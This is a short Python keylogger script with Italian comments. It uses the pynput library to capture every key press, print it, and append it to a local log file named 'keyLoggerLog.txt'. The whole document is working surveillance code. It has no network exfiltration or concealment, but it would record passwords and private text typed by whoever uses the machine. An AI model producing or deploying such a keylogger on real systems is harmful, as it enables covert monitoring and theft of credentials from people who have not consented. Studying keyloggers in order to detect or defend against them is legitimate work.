
from pynput import keyboard
import os

# Funzione chiamata quando un tasto viene premuto
def on_press(key):
    try:
        # Converte il tasto premuto in stringa
        key_str = str(key.char)
    except AttributeError:
        # Se non è un carattere stampabile, converti in formato leggibile
        key_str = f'[{key}]'

    # Salva il tasto premuto in un file di log
    
    print(key_str)
    with open('keyLoggerLog.txt', 'a') as f:
        f.write(key_str)

# Avvia il listener per gli eventi della tastiera
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()